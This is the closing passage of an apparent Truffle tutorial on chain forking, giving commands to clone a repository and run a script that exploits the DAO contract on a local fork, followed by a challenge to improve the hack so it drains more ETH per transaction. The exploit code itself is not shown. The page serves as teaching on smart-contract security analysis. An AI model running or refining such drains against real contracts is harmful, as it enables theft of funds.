<h2><a name="running-the-script" class="anchor" href="#running-the-script"><span class="header-link" style="z-index: 9999999169">&nbsp;</span></a>Running the script</h2><p>As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies:</p>
<pre><code class="lang-shell">$ git clone https://github.com/tcoulter/dao-truffle
$ cd dao-truffle
$ npm install
</code></pre>
<p>Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First <a href="http://truffleframework.com">install Truffle</a> then run:</p>
<pre><code class="lang-shell">$ truffle compile
</code></pre>
<p>From here, you can run the script by simply running:</p>
<pre><code class="lang-shell">$ node index.js
</code></pre>
<p>And now you&#39;ve exploited the DAO. Cheers!</p>
<h2><a name="but-dynamic-analysis-" class="anchor" href="#but-dynamic-analysis-"><span class="header-link" style="z-index: 9999999168">&nbsp;</span></a>But, Dynamic Analysis?</h2><p>Of course you might be asking, &quot;How does this apply to dynamic analysis? You&#39;ve only shown me how to exploit the DAO!&quot; Yes, that&#39;s true, but dynamic analysis was the trojan horse. Because <strong>this hack can be made better</strong>, to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I&#39;ve provided you. You&#39;ve been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out?</p>
<p>As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so&#8230;</p>
<pre><code class="lang-shell">$ testrpc --fork http://localhost:8545@1599200
</code></pre>
<p>&#8230; and then use Truffle&#39;s console to interact with the DAO directly:</p>
<pre><code class="lang-shell">$ truffle console
</code></pre>
<p>Good luck, and may all your code be secure!</p>

      </div>
    </div>

    <footer class="container">
      <p class="text-center">See a way to make this page better? <br class="visible-xs" /><a href="https://github.com/trufflesuite/trufflesuite.github.io/edit/master/_site/public/tutorials/chain-forking-exploiting-the-dao.md">Edit here &rarr;</a></p>
    </footer>
  </section>
</section>


<section class="Footer p-t-4 ">
  <div class="container">
    <div class="row">
      <div class="col-xs-12 col-md-2">
        <div class="Logo">
          
<svg class="truffle-logo" width="100%" height="100%" viewBox="655 52 131 128" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <polyline id="path-1" points="0 0.426 130.715 0.426 130.715 128 0 128"></polyline>
        <polygon id="path-3" points="0 0.426 130.715 0.426 130.715 128 0 128"></polygon>
    </defs>
    <g id="Logo" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(655.000000, 52.000000)">
        <!-- Truffle Logo -->

        <path d="M100.8574,99.9258 C100.8574,102.0878 82.8804,103.8378 65.6344,103.8378 C48.3884,103.8378 30.4124,102.0878 30.4124,99.9258 C30.4124,97.7658 48.3884,96.0138 65.6344,96.0138 C82.8804,96.0138 100.8574,97.7658 100.8574,99.9258" id="Fill-1" fill="#E6E7E8"></path>
        <g id="Group-5">
            <mask id="mask-2" fill="white">
                <use xlink:href="#path-1"></use>
            </mask>
            <g id="Clip-4"></g>
            <path d="M117.7813,50.4258 C117.7813,78.0398 95.3943,100.4258 67.7813,100.4258 C51.0803,100.4258 36.2913,92.2378 27.2113,79.6558 C21.2773,71.4358 18.9393,61.3388 18.9403,50.4258 C18.9403,35.2618 24.5313,21.6738 35.1913,12.5048 C43.9433,4.9768 55.3313,0.4258 67.7813,0.4258 C95.3943,0.4258 117.7813,22.8118 117.7813,50.4258" id="Fill-3" fill="#5E464D" mask="url(#mask-2)"></path>
        </g>
        <path d="M53.8936,94.4175 C55.9346,95.0525 62.7846,97.0835 63.0116,94.9175 C63.1366,93.7305 59.5436,92.6085 54.6076,90.1675 C47.5826,86.6945 41.1946,82.2065 35.5246,76.8335 C29.1906,70.8335 22.6076,61.2925 21.8576,47.2925 C21.0476,32.1835 26.6756,19.8005 36.1896,11.6595 C24.9566,20.8285 17.7816,34.7795 17.7816,50.4105 C17.7816,61.3545 21.2466,71.4225 27.2106,79.6565 C29.1966,81.4595 31.3236,83.1725 33.4116,84.6675 C39.0236,88.6875 47.1746,92.3275 53.8936,94.4175" id="Fill-6" fill="#FFFFFF"></path>
        <path d="M118.4668,38.9644 C115.3988,24.5534 105.8718,14.4624 93.1328,7.3374 C102.8738,14.2754 116.5888,29.0214 108.5048,42.0234 C101.6488,52.4484 84.9838,50.4034 75.8768,45.4644 C65.0498,39.5924 51.4838,26.3724 64.8638,13.4504 C73.5248,5.0894 101.1068,14.4644 96.2358,26.9644 C93.4048,34.2294 82.3948,32.6164 77.4388,29.0604 C73.7848,26.4384 70.7128,21.9294 72.3408,17.2754 C72.8628,15.7824 72.7868,13.4654 70.6798,15.1704 C69.1068,16.4434 68.3158,18.5384 68.0398,20.4864 C65.7358,36.7834 94.7688,49.4154 103.3798,33.6494 C107.8508,25.4644 100.6068,13.5894 91.4888,8.7144 C84.6208,5.0424 77.4998,2.4644 68.7578,3.0894 C54.7818,4.0884 43.0478,12.8314 41.5788,27.1154 C40.1228,41.2914 49.5978,54.0844 60.7748,61.7264 C72.5128,69.7534 88.3168,75.0464 102.7678,70.2574 C115.7198,65.9644 121.0708,51.0974 118.4668,38.9644" id="Fill-8" fill="#FFFFFF"></path>
        <path d="M100.2344,27.9272 C101.6234,18.5872 93.1804,12.1762 85.3844,9.2612 C76.1884,5.8212 64.0464,7.3312 57.3504,14.9472 C52.4384,20.5352 52.7724,28.6592 55.2964,35.2182 C59.1144,45.1422 67.7354,52.3152 77.7704,55.4112 C84.9014,57.6132 93.5214,58.5732 100.7504,56.2472 C111.2874,52.8582 114.7194,41.8662 112.5424,31.7982 C112.0734,29.6302 111.3594,27.4952 110.4064,25.4932 C109.0764,22.6982 104.9984,17.0422 110.6194,23.9312 C111.2334,24.6842 111.7204,25.5142 112.2424,26.3332 C113.4294,28.2002 114.2954,30.3142 114.9784,32.4102 C118.0444,41.8102 115.6374,52.7752 107.1294,58.4472 C100.6124,62.7912 92.3294,63.3062 84.7694,62.2222 C74.6384,60.7702 65.0854,55.8372 58.4524,47.9822 C52.3874,40.8022 48.2554,30.4882 50.7474,21.0642 C52.5704,14.1662 58.1724,9.0192 64.8764,6.8492 C73.3604,4.1012 82.6984,5.3762 90.3444,9.8372 C94.1684,12.0682 97.6714,15.1532 99.6164,19.1932 C100.4904,21.0072 100.9934,23.0192 101.0114,25.0352 C101.0184,25.8482 100.9834,26.6872 100.8214,27.4862 C100.7684,27.7782 100.1484,28.6072 100.2344,27.9272" id="Fill-10" fill="#3FE0C5"></path>
    </g>
</svg>

<svg class="truffle-wordmark" width="100%" height="100%" viewBox="655 52 131 128" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <polyline id="path-1" points="0 0.426 130.715 0.426 130.715 128 0 128"></polyline>
        <polygon id="path-3" points="0 0.426 130.715 0.426 130.715 128 0 128"></polygon>
    </defs>
    <g id="Logo" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(655.000000, 52.000000)">
        <!-- Truffle Wordmark -->

        <polygon id="Fill-12" fill="#5F464D" points="0 108.8555 10.321 108.8555 10.321 112.3595 6.919 112.3595 6.919 127.5295 3.313 127.5295 3.313 112.3595 0 112.3595"></polygon>
        <path d="M22.8096,116.1543 L24.9236,116.1543 C26.0536,116.1543 26.8326,116.0063 27.2586,115.7093 C27.6846,115.4123 27.8976,114.9203 27.8976,114.2303 C27.8976,113.8243 27.7916,113.4683 27.5806,113.1683 C27.3706,112.8673 27.0876,112.6503 26.7336,112.5173 C26.3796,112.3863 25.7296,112.3203 24.7846,112.3203 L22.8096,112.3203 L22.8096,116.1543 Z M19.2546,108.8553 L24.0216,108.8553 C26.0836,108.8553 27.5536,109.0393 28.4286,109.4063 C29.3026,109.7753 30.0066,110.3863 30.5396,111.2423 C31.0716,112.0953 31.3386,113.1073 31.3386,114.2753 C31.3386,115.5043 31.0436,116.5293 30.4556,117.3533 C29.8686,118.1793 28.9816,118.8043 27.7966,119.2263 L32.2206,127.5293 L28.3346,127.5293 L24.1356,119.6213 L22.8096,119.6213 L22.8096,127.5293 L19.2546,127.5293 L19.2546,108.8553 Z" id="Fill-14" fill="#5F464D"></path>
        <g id="Group-18">
            <mask id="mask-4" fill="white">
                <use xlink:href="#path-3"></use>
            </mask>
            <g id="Clip-17"></g>
            <path d="M41.2588,108.8555 L44.8258,108.8555 L44.8258,120.9315 C44.8258,121.9705 44.9168,122.7075 45.0988,123.1385 C45.2808,123.5705 45.5808,123.9145 46.0008,124.1715 C46.4188,124.4295 46.9248,124.5585 47.5178,124.5585 C48.1438,124.5585 48.6838,124.4165 49.1358,124.1265 C49.5888,123.8395 49.9028,123.4745 50.0748,123.0315 C50.2488,122.5855 50.3358,121.7385 50.3358,120.4865 L50.3358,108.8555 L53.9038,108.8555 L53.9038,119.9885 C53.9038,121.8675 53.7978,123.1715 53.5858,123.8985 C53.3738,124.6265 52.9698,125.3305 52.3738,126.0055 C51.7768,126.6835 51.0888,127.1855 50.3108,127.5095 C49.5318,127.8355 48.6258,128.0005 47.5938,128.0005 C46.2388,128.0005 45.0618,127.6875 44.0578,127.0665 C43.0558,126.4435 42.3378,125.6665 41.9058,124.7305 C41.4748,123.7945 41.2588,122.2145 41.2588,119.9885 L41.2588,108.8555 Z" id="Fill-16" fill="#5F464D" mask="url(#mask-4)"></path>
        </g>
        <polygon id="Fill-19" fill="#5F464D" points="64.6611 108.8555 73.9281 108.8555 73.9281 112.3205 68.1891 112.3205 68.1891 115.7105 73.9281 115.7105 73.9281 119.1255 68.1891 119.1255 68.1891 127.5295 64.6611 127.5295"></polygon>
        <polygon id="Fill-21" fill="#5F464D" points="83.7676 108.8555 93.0356 108.8555 93.0356 112.3205 87.2966 112.3205 87.2966 115.7105 93.0356 115.7105 93.0356 119.1255 87.2966 119.1255 87.2966 127.5295 83.7676 127.5295"></polygon>
        <polygon id="Fill-23" fill="#5F464D" points="102.8398 108.8555 106.3948 108.8555 106.3948 124.1405 111.5738 124.1405 111.5738 127.5295 102.8398 127.5295"></polygon>
        <polygon id="Fill-25" fill="#5F464D" points="120.5205 108.8555 130.7145 108.8555 130.7145 112.3345 124.0495 112.3345 124.0495 115.7105 130.7145 115.7105 130.7145 119.1255 124.0495 119.1255 124.0495 124.0395 130.7145 124.0395 130.7145 127.5295 120.5205 127.5295"></polygon>
    </g>
</svg>

        </div>
      </div>
      <div class="col-xs-12 col-md-3">
        <ul class="list-unstyled">
          <li><a href="/">Home</a></li>
          <li><a href="/support">Support</a></li>
          <li><a href="/tutorials">Tutorials</a></li>
          <li><a href="/community">Community</a></li>
          <li><a href="/dashboard">Dashboard</a></li>
          <li><a href="https://github.com/trufflesuite">Github</a></li>
          <li><a href="https://twitter.com/trufflesuite">Twitter</a></li>
        </ul>
        <div class="john-attribution">
          <strong>A CONSENSYS FORMATION &copy; 2017</strong>
          <strong>DESIGN BY JOHN MCDOWALL</strong>
        </div>
      </div>
      <div class="col-xs-12 col-md-7">
        <div class="BetaSignup">
        <h5>SIGN UP FOR THE TRUFFLE MAILING LIST</h5>
        <div id="mc_embed_signup">
          <form action="//readthedocs.us14.list-manage.com/subscribe/post?u=563e4b50100f771d2d17cf7a5&amp;id=b754a8ab50" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
              <div id="mc_embed_signup_scroll">
                <div class='FormWrapper'>
                  <div class="mc-field-group">
                    <label for="mce-FNAME">First Name </label>
                    <input type="text" value="" name="FNAME" class="" id="mce-FNAME">
                  </div>

                  <div class="mc-field-group">
                    <label for="mce-EMAIL">Your Email Address</label>
                    <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" required>
                  </div>
                  <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
                  <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_563e4b50100f771d2d17cf7a5_b754a8ab50" tabindex="-1" value=""></div>
                  <div class="clear"><input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
                </div>
              </div>
            </form>
        </div>
      </div>
      </div>
    </div>
    <svg class="footer-wordmark" width="1171px" height="187px" viewBox="145 231 1171 187" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <!-- Generator: Sketch 39.1 (31720) - http://www.bohemiancoding.com/sketch -->
        <desc>Created with Sketch.</desc>
        <defs></defs>
        <g id="Logo-Text" opacity="0.0299999993" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(145.000000, 231.000000)">
            <polygon id="Fill-12" fill="#5F464D" points="0 2 94.8103448 2 94.8103448 35.4000214 63.5590326 35.4000214 63.5590326 180 30.4337441 180 30.4337441 35.4000214 0 35.4000214"></polygon>
            <path d="M202.080259,71.573846 L221.485044,71.573846 C231.857517,71.573846 239.008098,70.1631145 242.918429,67.3321195 C246.828759,64.5011246 248.783924,59.8113955 248.783924,53.2343365 C248.783924,49.3643569 247.810931,45.9709757 245.874124,43.1113848 C243.946497,40.242262 241.348789,38.1738246 238.099359,36.9060726 C234.84993,35.6573846 228.883463,35.0282746 220.209138,35.0282746 L202.080259,35.0282746 L202.080259,71.573846 Z M169.448276,2 L213.205425,2 C232.132893,2 245.626287,3.7538824 253.658069,7.25211524 C261.680671,10.769412 268.142814,16.5934454 273.035317,24.7528114 C277.91864,32.8835815 280.369481,42.5299347 280.369481,53.6632751 C280.369481,65.3780658 277.661623,75.1483346 272.264265,83.0026775 C266.876087,90.8760844 258.734155,96.8335654 247.856827,100.856057 L288.465517,180 L252.795226,180 L214.251851,104.621185 L202.080259,104.621185 L202.080259,180 L169.448276,180 L169.448276,2 Z" id="Fill-14" fill="#5F464D"></path>
            <path d="M369.155172,0 L401.021365,0 L401.021365,117.953095 C401.021365,128.101593 401.834323,135.300287 403.460241,139.510107 C405.086158,143.729694 407.766241,147.089736 411.518358,149.6 C415.252608,152.120031 419.773015,153.380047 425.070647,153.380047 C430.663087,153.380047 435.487238,151.993053 439.52523,149.16046 C443.572156,146.357169 446.37731,142.792008 447.913891,138.464978 C449.46834,134.108645 450.245564,125.835518 450.245564,113.606529 L450.245564,0 L482.12069,0 L482.12069,108.742283 C482.12069,127.095534 481.173727,139.832437 479.279801,146.933455 C477.385876,154.044241 473.776697,160.920606 468.452264,167.513711 C463.118898,174.136119 456.972573,179.039436 450.022224,182.204126 C443.06294,185.388352 434.969088,187 425.749601,187 C413.644558,187 403.129697,183.942753 394.160351,177.877096 C385.208872,171.791904 378.794539,164.202507 374.935219,155.060068 C371.084832,145.917629 369.155172,130.484879 369.155172,108.742283 L369.155172,0 Z" id="Fill-16" fill="#5F464D"></path>
            <polygon id="Fill-19" fill="#5F464D" points="578.948276 2 666.698276 2 666.698276 35.0282746 612.355204 35.0282746 612.355204 67.3416515 666.698276 67.3416515 666.698276 99.8933276 612.355204 99.8933276 612.355204 180 578.948276 180"></polygon>
            <polygon id="Fill-21" fill="#5F464D" points="748.396552 2 836.146552 2 836.146552 35.0282746 781.809343 35.0282746 781.809343 67.3416515 836.146552 67.3416515 836.146552 99.8933276 781.809343 99.8933276 781.809343 180 748.396552 180"></polygon>
            <polygon id="Fill-23" fill="#5F464D" points="918.853448 2 952.107097 2 952.107097 147.696155 1000.55172 147.696155 1000.55172 180 918.853448 180"></polygon>
            <polygon id="Fill-25" fill="#5F464D" points="1075.18966 2 1170 2 1170 35.1617222 1108.01148 35.1617222 1108.01148 67.3416515 1170 67.3416515 1170 99.8933276 1108.01148 99.8933276 1108.01148 146.733426 1170 146.733426 1170 180 1075.18966 180"></polygon>
        </g>
    </svg>
  </div>
</section>


    </main>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script async defer src="https://buttons.github.io/buttons.js"></script>
<script src="/scripts/main.js"></script>
<script src="/deps/scripts/prism.js"></script>
<script src="/deps/scripts/collapse.js"></script>
<script src="/deps/scripts/dropdown.js"></script>
<script src="/deps/scripts/lunr.js"></script>
<script src="/scripts/navbar.js"></script>

    
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-83874933-3', 'auto');
    ga('send', 'pageview');
  </script>

  </body>
</html>
